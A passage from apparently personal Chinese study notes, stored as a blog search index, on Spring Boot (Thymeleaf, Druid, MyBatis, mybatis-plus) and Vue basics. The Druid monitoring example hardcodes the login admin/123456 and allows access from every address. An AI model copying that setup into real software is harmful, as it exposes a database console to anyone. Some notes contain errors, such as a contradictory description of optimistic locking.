class=\"keyword\">final</span> String DEFAULT_SUFFIX = <span class=\"string\">&quot;.html&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>所有的html元素都可以被thymeleaf替换jieguan： th:元素名</p>\n<p>如果想diy一些定制化功能，只要写这个组件，然后将它交给springboot，springboot就会帮我们自动装配</p>\n<p>（拓展springmvc）</p>\n<p>@Bean注解表示该方法返回一个Bean通常配合@Configuration使用</p>\n<h2 id=\"国际化\"><a href=\"#国际化\" class=\"headerlink\" title=\"国际化\"></a>国际化</h2><p>1.resouces目录下建立i18n文件夹</p>\n<p>2.建立各个语言包并设置字段</p>\n<p>3.自定义地区解析器</p>\n<p>4.添加功能到MVCconfig类中设置bean生成方法 </p>\n<p>5.在网站文件中修改国际化显示文本#{xxx}同时修改国际化提交参数</p>\n<p>在需要提取的组件下增加<code>th:fragment=&quot;sidebar&quot;</code>提取公共页面放到common文件夹下</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">th:replace</span>=<span class=\"string\">&quot;~&#123;commons/commons::topbar&#125;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">th:replace</span>=<span class=\"string\">&quot;~&#123;commons/commons::sidebar(active=&#x27;list.html&#x27;)&#125;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以传参数搞掂高亮，三元运算符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;a th:class=&quot;$&#123;active==&#x27;main.html&#x27; ? &#x27;nav-link active&#x27; : &#x27;nav-link&#x27;&#125;&quot; th:href=&quot;@&#123;/main.html&#125;&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"高级手段\"><a href=\"#高级手段\" class=\"headerlink\" title=\"高级手段\"></a>高级手段</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;select class=&quot;form-control&quot; name=&quot;department.id&quot;&gt;</span><br><span class=\"line\">    &lt;option  th:each=&quot;dept:$&#123;departments&#125;&quot; th:selected=&quot;$&#123;dept.getId()==emp.getDepartment().getId()&#125;&quot; th:text=&quot;$&#123;dept.getDepartmentName()&#125;&quot;</span><br><span class=\"line\">            th:value=&quot;$&#123;dept.getId()&#125;&quot;&gt;1&lt;/option&gt;</span><br><span class=\"line\">&lt;/select&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h1><h2 id=\"JDBC-DATA\"><a href=\"#JDBC-DATA\" class=\"headerlink\" title=\"JDBC DATA\"></a>JDBC DATA</h2><p>使用jdbc template使用默认的数据源HikariCP，直接利用写sql语句增删查改。</p>\n<h2 id=\"Druid\"><a href=\"#Druid\" class=\"headerlink\" title=\"Druid\"></a>Druid</h2><ol>\n<li>pom引入Druid依赖,自带starter不需要引入</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.alibaba<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>druid<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.2.8<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"2\">\n<li>修改数据源为Druid，并配置相关</li>\n</ol>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">type:</span> <span class=\"string\">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class=\"line\">   <span class=\"attr\">filters:</span> <span class=\"string\">wall,stat,log4j</span></span><br><span class=\"line\">   <span class=\"comment\">#2.连接池配置</span></span><br><span class=\"line\">   <span class=\"comment\">#初始化连接池的连接数量 大小，最小，最大</span></span><br><span class=\"line\">   <span class=\"attr\">initial-size:</span> <span class=\"number\">5</span></span><br><span class=\"line\">   <span class=\"attr\">min-idle:</span> <span class=\"number\">5</span></span><br><span class=\"line\">   <span class=\"attr\">max-active:</span> <span class=\"number\">20</span></span><br><span class=\"line\">   <span class=\"comment\">#配置获取连接等待超时的时间</span></span><br><span class=\"line\">   <span class=\"attr\">max-wait:</span> <span class=\"number\">60000</span></span><br><span class=\"line\">   <span class=\"comment\">#配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒</span></span><br><span class=\"line\">   <span class=\"attr\">time-between-eviction-runs-millis:</span> <span class=\"number\">60000</span></span><br><span class=\"line\">   <span class=\"comment\"># 配置一个连接在池中最小生存的时间，单位是毫秒</span></span><br><span class=\"line\">   <span class=\"attr\">min-evictable-idle-time-millis:</span> <span class=\"number\">30000</span></span><br><span class=\"line\">   <span class=\"attr\">validation-query:</span> <span class=\"string\">SELECT</span> <span class=\"number\">1</span> <span class=\"string\">FROM</span> <span class=\"string\">DUAL</span></span><br><span class=\"line\">   <span class=\"attr\">test-while-idle:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">   <span class=\"attr\">test-on-borrow:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">   <span class=\"attr\">test-on-return:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">   <span class=\"comment\"># 是否缓存preparedStatement，也就是PSCache  官方建议MySQL下建议关闭   个人建议如果想用SQL防火墙 建议打开</span></span><br><span class=\"line\">   <span class=\"attr\">pool-prepared-statements:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">   <span class=\"attr\">max-pool-prepared-statement-per-connection-size:</span> <span class=\"number\">20</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><p>编写配置类DruidConfig,因为Springboot内置了servlet容器，所以没有web.xml ,替代方法是使用bean </p>\n<p>  比如ServletRegistraBean，FilterRegistrationBean配置传一个Map配置参数。</p>\n <figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DruidConfig</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"meta\">@ConfigurationProperties(prefix = &quot;spring.datasource&quot;)</span></span><br><span class=\"line\">\t<span class=\"meta\">@Bean</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> DataSource <span class=\"title\">druidDataSource</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">new</span> DruidDataSource();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"comment\">//\t后台监控相当于web.xml ServletRegistrationBean</span></span><br><span class=\"line\"><span class=\"comment\">//\t因为Springboot内置了servlet容器，所以没有web.xml ,替代方法使用bean ServletRegistraBean</span></span><br><span class=\"line\">\t<span class=\"meta\">@Bean</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> ServletRegistrationBean <span class=\"title\">a</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\tServletRegistrationBean&lt;StatViewServlet&gt; bean = <span class=\"keyword\">new</span> ServletRegistrationBean&lt;&gt;(<span class=\"keyword\">new</span> StatViewServlet(), <span class=\"string\">&quot;/druid/*&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//\t\t后台需要有人登陆</span></span><br><span class=\"line\">\t\tHashMap&lt;String,String&gt; initparam = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\"><span class=\"comment\">//\t\t增加配置，固定参数账号密码</span></span><br><span class=\"line\">\t\tinitparam.put(<span class=\"string\">&quot;loginUsername&quot;</span>,<span class=\"string\">&quot;admin&quot;</span>);</span><br><span class=\"line\">\t\tinitparam.put(<span class=\"string\">&quot;loginPassword&quot;</span>,<span class=\"string\">&quot;123456&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//\t\t运行运行谁访问,空代表所有可以访问，localhost本机</span></span><br><span class=\"line\">\t\tinitparam.put(<span class=\"string\">&quot;allow&quot;</span>,<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//\t\t禁止谁访问</span></span><br><span class=\"line\"><span class=\"comment\">//\t\tinitparam.put(&quot;gan&quot;,&quot;122.122.122.122&quot;);</span></span><br><span class=\"line\">\t\tbean.setInitParameters(initparam);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> bean;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"meta\">@Bean</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> FilterRegistrationBean <span class=\"title\">webstatFilter</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\tFilterRegistrationBean&lt;Filter&gt; bean = <span class=\"keyword\">new</span> FilterRegistrationBean&lt;&gt;();</span><br><span class=\"line\">\t\tHashMap&lt;String, String&gt; initparam = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\"><span class=\"comment\">//\t过滤，这些东西不统计</span></span><br><span class=\"line\">\t\tinitparam.put(<span class=\"string\">&quot;exclution&quot;</span>,<span class=\"string\">&quot;*.js,*.css,/druid/*&quot;</span>);</span><br><span class=\"line\">\t\tbean.setInitParameters(initparam);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> bean;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<h2 id=\"Mybatis（重点）\"><a href=\"#Mybatis（重点）\" class=\"headerlink\" title=\"Mybatis（重点）\"></a>Mybatis（重点）</h2><p>1.导入整合包依赖 mybatis-spring-boot-starter</p>\n<p>2.对应Mapper接口上标注@Mapper与@Repository，或者在主方法上面注解@MapperScan(“扫描的包”)如@MapperScan(“com.gan.mapper”)</p>\n<p>3.在resource/mybatis/mapper/xxxMapper.xml下编写语句</p>\n<p><strong>可以在springboot配置文件中配置mybatis，比如说设置别名，还有设置mapper.xml文件的地址等</strong></p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#mybatis整合</span></span><br><span class=\"line\"><span class=\"meta\">mybatis.type-aliases-package</span>=<span class=\"string\">com.gan.pojo</span></span><br><span class=\"line\"><span class=\"meta\">mybatis.mapper-locations</span>=<span class=\"string\">classpath:/mybatis/mapper/*.xml</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"SpringSecurity-安全\"><a href=\"#SpringSecurity-安全\" class=\"headerlink\" title=\"SpringSecurity(安全)\"></a>SpringSecurity(安全)</h1><p>shiro SpringSecurity除了类，名字不一样，功能类似解决（认证，授权）两个问题</p>\n<h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>Spring Security 是针对Spring项目的安全框架，也是Spring Boot底层安全模块默认的技术选型，他可以实现强大的Web安全控制，对于安全控制，我们仅需要引入spring-boot-starter-security模块，进行少量的配置，即可实现强大的安全管理!<br>记住几个类：<br>• WebSecurityConfigurerAdapter：自定义Security策略<br>· AuthenticationManagerBuilder：自定义认证策略<br>• @EnableWebSecurity：开启WebSecurity模式            @EnabledXXX 意为开启某个功能<br>Spring Security的两个主要目标是“认证”和“授权”(访问控制)<br>“认证”（Authentication）<br>“授权”(Authorization)<br>这个概念是通用的，而不是只在Spring Security 中存在。</p>\n<p>导入依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-security<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"mybatis-plus\"><a href=\"#mybatis-plus\" class=\"headerlink\" title=\"mybatis-plus\"></a>mybatis-plus</h1><h2 id=\"入门\"><a href=\"#入门\" class=\"headerlink\" title=\"入门\"></a>入门</h2><p>写好的mapper接口继承mybatis-plus的BaseMapper接口，基本的增删改查就写好了。启动类记得扫描mapper包</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Repository</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">UserMapper</span> <span class=\"keyword\">extends</span> <span class=\"title\">BaseMapper</span>&lt;<span class=\"title\">User</span>&gt; </span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@MapperScan(&quot;com.iu2wyt.mapper&quot;)</span>  或者上面加<span class=\"meta\">@Mapper</span></span><br></pre></td></tr></table></figure>\n\n<p>插入时如果没设置id会自动生成</p>\n<h3 id=\"主键自动生成策略\"><a href=\"#主键自动生成策略\" class=\"headerlink\" title=\"主键自动生成策略\"></a>主键自动生成策略</h3><p>（自增算法，uuid，雪花算法，zk，redis）</p>\n<blockquote>\n<p>​    默认ID_WORKER 全局唯一ID</p>\n</blockquote>\n<ol>\n<li>雪花算法，字段上<code>@TableId(type = IdtType.worker)</code>唯一</li>\n</ol>\n<p>snowflake是Twitter开源的分布式ID生成算法，结果是一个long型的ID（64位）。其核心思想是：前41bit使用当前毫秒数，10bit作为机器的ID（5个bit是数据中心位置代码，5个bit的机器ID），12bit作为毫秒内的流水号（意味着每个节点在每毫秒可以产生 4096个ID），最后还有一个符号位，永远是0。全球唯一</p>\n<blockquote>\n<p>​    主键自增</p>\n</blockquote>\n<ol start=\"2\">\n<li>需要配置主键自增，字段上<code>@TableId(type = IdtType.auto)</code>,同时注意数据库的字段也要自增 </li>\n</ol>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220216163047049.png\" alt=\"image-20220216163047049\"></p>\n<h2 id=\"日志\"><a href=\"#日志\" class=\"headerlink\" title=\"日志\"></a>日志</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mybatis-plus.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"自动填充\"><a href=\"#自动填充\" class=\"headerlink\" title=\"自动填充\"></a>自动填充</h2><p><code>@TableField</code></p>\n<h2 id=\"乐观锁\"><a href=\"#乐观锁\" class=\"headerlink\" title=\"乐观锁\"></a>乐观锁</h2><blockquote>\n<p>乐观锁：认为总是不会出现问题，干什么都上锁，如果出现问题，再次更新值测试！</p>\n<p>（当要更新记录时，希望这条记录没有被更新）</p>\n<p>乐观锁是相对悲观锁而言的，乐观锁假设数据一般情况不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果冲突，则返回给用户异常信息，让用户决定如何去做。乐观锁适用于读多写少的场景，这样可以提高程序的吞吐量。</p>\n<p>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n<p>实现步骤：</p>\n<pre><code>1. 数据库增加version字段\n1. 在实体类中增加字段，并添加注解`@Version`\n1. \n1. \n</code></pre>\n<p>悲观锁：认为总是会出现问题，无论干什么都上锁！再去操作</p>\n</blockquote>\n<p>乐观锁实现</p>\n","categories":["开发"],"tags":["hexo"]},{"title":"vue全家桶","url":"/p/66002/","content":"<h2 id=\"简单元素的使用\"><a href=\"#简单元素的使用\" class=\"headerlink\" title=\"简单元素的使用\"></a>简单元素的使用</h2><ol>\n<li><p>el绑定命名空间，各种css选择器都可以获取到，但还是建议使用id选择，具有唯一性。</p>\n</li>\n<li><p>作用域在绑定的标签以及绑定的标签的各级字标签</p>\n</li>\n<li><p>不能将绑定body标签或者html标签，其他的一般都能绑定比如div，p，h等</p>\n</li>\n<li><p>部分替换只可以使用<code>&#123;&#123;&#125;&#125;`，不能使用v-text，其会完全替换，v-html可以识别标签，v-text不会。v-text支持表达式，\n\n    `&#123;&#123;可以写函数名&#125;&#125;</code></p>\n</li>\n<li><p>事件绑定v-on或者@，js中</p>\n</li>\n</ol>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;sjbd&quot;</span> <span class=\"attr\">v-on:click</span>=<span class=\"string\">&quot;dolt&quot;</span>&gt;</span>按钮一<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;sjbd&quot;</span> <span class=\"attr\">v-on:dbclick</span>=<span class=\"string\">&quot;dolt2&quot;</span>&gt;</span>按钮二<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;sjbd&quot;</span> <span class=\"attr\">v-on:mouseenter</span>=<span class=\"string\">&quot;dolt3&quot;</span>&gt;</span>按钮三<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;sjbd&quot;</span> @<span class=\"attr\">click</span>=<span class=\"string\">&quot;dolt3&quot;</span>&gt;</span>按钮四<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">   df</span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">var</span> vue = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"attr\">el</span>:<span class=\"string\">&quot;#app&quot;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"attr\">methods</span>:&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">           <span class=\"attr\">dolt</span>:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">               alert(<span class=\"string\">&quot;click&quot;</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">           &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">           <span class=\"attr\">dolt2</span>:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">               alert(<span class=\"string\">&quot;dbclick&quot;</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">           &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">           <span class=\"attr\">dolt3</span>:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">               alert(<span class=\"string\">&quot;mouseenter&quot;</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">           &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">          &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">      &#125;)</span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以自定义参数</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">button</span> @<span class=\"attr\">click</span>=<span class=\"string\">&quot;doId(&#x27;7d7d7&#x27;,55555556)&quot;</span>&gt;</span>请点我<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> @<span class=\"attr\">keyup.enter</span>=<span class=\"string\">&quot;sayhi&quot;</span>/&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">       <span class=\"keyword\">var</span> vue = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">           <span class=\"attr\">el</span>:<span class=\"string\">&quot;#app&quot;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">           <span class=\"attr\">data</span>:&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">           &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">           <span class=\"attr\">methods</span>:&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">               <span class=\"attr\">doId</span>:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">id1,id2</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                   <span class=\"built_in\">console</span>.log(id1);</span></span><br><span class=\"line\"><span class=\"javascript\">                   <span class=\"built_in\">console</span>.log(id2);</span></span><br><span class=\"line\"><span class=\"javascript\">               &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">               <span class=\"attr\">sayhi</span>:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                   alert(<span class=\"string\">&quot;吃了吗&quot;</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">               &#125;             </span></span><br><span class=\"line\"><span class=\"javascript\">           &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">       &#125;)</span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以传一个$event 参数，如果不写括号而且方法需要参数，会默认将event传过去</p>\n<p>v-on修饰符</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220123121857909.png\" alt=\"image-20220123121857909\"></p>\n<ol start=\"6\">\n<li>Vue更关注数据，数据与内容双向绑定，数据发生变化则内容呢发生变化，this关键字获取属性。</li>\n<li>v-show、v-if区别是一个是不显示(display为none)，一个是不存在(在dom中去除)</li>\n<li>标签属性设置v-bind绑定属性使得可以动态修改下面是简写</li>\n</ol>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">v-bind:src</span>=<span class=\"string\">&quot;imgSrc&quot;</span> <span class=\"attr\">v-bind:title</span>=<span class=\"string\">&quot;imgTitle+&#x27;!!!&#x27;&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">:src</span>=<span class=\"string\">&quot;imgSrc&quot;</span> <span class=\"attr\">:title</span>=<span class=\"string\">&quot;imgTitle+&#x27;!!!&#x27;&quot;</span>/&gt;</span>  </span><br></pre></td></tr></table></figure>\n\n<p>v-bind绑定style</p>\n<ul>\n<li>对象语法 <code>:style=&quot;&#123;fontSize:变量名&#125;&quot;</code>  如果变量名加了单引号则会被解析成字符串</li>\n<li>数组语法 <code>:style=[baseStyle1,baseStyle2]</code> 然后在vue中写<img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220123113457661.png\" alt=\"image-20220123113457661\"></li>\n</ul>\n<ol start=\"9\">\n<li><p>active取决去isActive的真假，更为简洁</p>\n <figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">:class</span>=<span class=\"string\">&quot;isActive?&#x27;active&#x27;:&#x27;&#x27;&quot;</span> <span class=\"attr\">:src</span>=<span class=\"string\">&quot;imgSrc&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">:class</span>=<span class=\"string\">&quot;&#123;active:isActive&#125;&quot;</span> <span class=\"attr\">:src</span>=<span class=\"string\">&quot;imgSrc&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n<p>绑定class方便修改css</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">v-bind:class</span>=<span class=\"string\">&quot;&#123;类名1:boolean,类名2:boolean&#125;&quot;</span>&gt;</span></span><br><span class=\"line\">    布尔值决定是否有这个类</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"C:\\Users\\86188\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220122200751277.png\" alt=\"image-20220122200751277\"></p>\n<ol start=\"10\">\n<li><p>v-for遍历数组</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">v-for</span>=<span class=\"string\">&quot;(item,index) in people&quot;</span>&gt;</span>第&#123;&#123;index+1&#125;&#125;个:[姓名:&#123;&#123;item.name&#125;&#125;，年龄:&#123;&#123;item.age&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span>]</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span>  </span><br></pre></td></tr></table></figure>\n\n<p>遍历对象,如果只有一个属性的话就是value</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">v-for</span>=<span class=\"string\">&quot;(key,value) in people&quot;</span>&gt;</span>&#123;&#123;key&#125;&#125;:&#123;&#123;value&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>两个属性就是(value,key)</p>\n<p>三个属性是（value,key,index）</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220123162130118.png\" alt=\"image-20220123162130118\"></p>\n</li>\n</ol>\n<h4 id=\"支持响应式的数组方法\"><a href=\"#支持响应式的数组方法\" class=\"headerlink\" title=\"支持响应式的数组方法\"></a>支持响应式的数组方法</h4><ol>\n<li>push()</li>\n</ol>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220123164119235.png\" alt=\"image-20220123164119235\"></p>\n<p>除了通过下标改数组不会改变其他都可以，如果想修改特定位置的值可以使用splice代替index修改或者使用vue自带的set方法</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220123164343934.png\" alt=\"image-20220123164343934\"></p>\n<ol start=\"11\">\n<li><p>v-model表单数据双向绑定，方便提交</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;usr&quot;</span> <span class=\"attr\">v-model</span>=<span class=\"string\">&quot;usrname&quot;</span>/&gt;</span></span><br><span class=\"line\"> data:&#123;</span><br><span class=\"line\">                usrname:&quot;admin&quot;,</span><br><span class=\"line\">      &#125;,</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220123225202839.png\" 